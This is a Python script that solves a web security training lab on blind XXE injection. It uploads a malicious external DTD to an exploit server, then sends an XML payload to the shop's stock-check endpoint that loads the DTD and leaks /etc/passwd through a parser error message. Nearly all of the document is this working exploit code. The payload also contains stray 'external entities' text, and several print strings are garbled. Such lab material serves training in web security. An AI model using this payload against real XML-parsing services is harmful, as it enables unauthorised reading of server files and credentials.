####################################################################
#
# Lab: Exploiting blind XXE to retrieve data via error messages
#
# Hack Steps:
#      1. Store the malicious DTD file in your exploit server
#      2. Inject payload into the check stock request to retrieve
#         the content of /etc/passwd via error message
#      3. Extract the first line as a proof
#
####################################################################
import requests
from colorama import Fore
import re

# Change this to your lab URL
LAB_URL = "https://0a9f00fd047ed84a807fe90700de009c.web-security-academy.net" 

# Change this to your exploit server URL
EXPLOIT_SERVER_URL = "https://exploit-0a06001e0418d8ee8081e819011100fe.exploit-server.net" 

def main():
    print("â¦—#â¦˜ Injection point: " + Fore.YELLOW + "Check stock request")
    print(Fore.WHITE + "â¦—1â¦˜ Storing the malicious DTD file on your exploit server.. ", end="", flush=True)

    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=utf-8"
    malicious_file_name = "exploit.dtd"
    malicious_file = f"""<!ENTITY % file SYSTEM "file:///etc/passwd">
                            <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'file:///notexist/%file;'>">
                            %eval;
                            %exfiltrate;"""
    data = { "responseFile": f"/{malicious_file_name}", "responseBody": malicious_file, "responseHead": response_head, "formAction": "STORE", "urlIsHttps": "on" }
    post_data(EXPLOIT_SERVER_URL, data)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—2â¦˜ Injecting payload to retrieve the content of /etc/passwd via error message.. ", end="", flush=True)

    payload = f"""<?xml version="1.0" encoding="UTF-8"?>
                    <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{EXPLOIT_SERVER_URL}/{malicious_file_name}"> %xxe; ]>
                    <stockCheck>
                        <productId>
                            2
                        </productId>
                        <storeId>
                            1
                        </storeId>external entities
                        external entities
                    </stockCheck>"""
    headers = { "Content-Type": "application/xml" }
    injection = post_data(f"{LAB_URL}/product/stock", payload, headers)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—3â¦˜ Extracting the first line as a proof.. ", end="", flush=True)
    
    first_line = re.findall("/(root:.*)\n", injection.text)[0]

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + first_line)
    print(Fore.WHITE + "ðŸ—¹ The lab should be marked now as " + Fore.GREEN + "solved")


def post_data(url, data, headers = None):
    try:    
        return requests.post(url, data, headers=headers, allow_redirects=False)
    except:
        print(Fore.RED + "â¦—!â¦˜ Failed to post data to " + url + " through exception")
        exit(1)


if __name__ == "__main__":
    main()